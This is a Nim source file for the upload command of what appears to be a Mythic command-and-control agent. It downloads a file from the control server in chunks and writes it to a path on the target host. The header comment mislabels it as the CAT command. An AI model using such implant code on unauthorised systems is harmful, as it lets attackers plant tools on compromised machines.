# This is the source for the CAT command
import ../structs
import ../utils
import ../fileManager
import json
import os
import std/options

#
#[
Takes a file that was uploaded to mythic and writes
it to the local path
  {
    "remote_path": "somepath",
    "file": "filebytes",
    "file_name": "nameofthefile.txt",
    "host": "localhost"
  }

]#
proc cmd_upload*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  var path = params["remote_path"].getStr()
  var host = params["host"].getStr()
  let fileUUID = params["file"].getStr()
  let file_name = params["file_name"].getStr()

  # Configure Output
  var
    fullPath = ""
    output = ""

  fullPath = resolveCorrectPath(path, host)

  # if a dir is specified, atttach the filename
  if path == "." or path == "":
    fullPath = fullPath / file_name
  else:
    # Differentiate between destination beeing a path
    # and a file
    if path.dirExists():
      fullPath = fullPath / file_name


  # Dont download it from the server
  # if the file already exists on disk
  if fullPath.fileExists():
    return buildReturnData(task.id, output, "error")

  DBG("[*] Downloading the file to: " & fullPath)

  try:

    var outFile = fullPath.open(fmWrite)
    defer: outFile.close()

    var chunk_data: seq[byte]

    # Download the file to `fullp_ath`
    #
    for chunk in downloadFileFromMythic(fileUUID, task.id):
      if chunk.isSome:
        chunk_data = chunk.get()
        DBG($chunk_data[0..100])
        let bytesWritten = outFile.writeBytes(chunk_data, 0, len(chunk_data))
        if bytesWritten != len(chunk_data):
          DBG("[-] An error occured, aborting")
          return buildReturnData(task.id, output, "error")

    # dont let anything remain in memory
    chunk_data = @[byte 0]

  except IOError:
    DBG("[-] An error occured writing to the file")
    return buildReturnData(task.id, output, "error")

  # return the response
  output = $cast[int](StatusCodes.UploadSuccessful) #"File uploaded successfully"
  return buildReturnData(task.id, output)

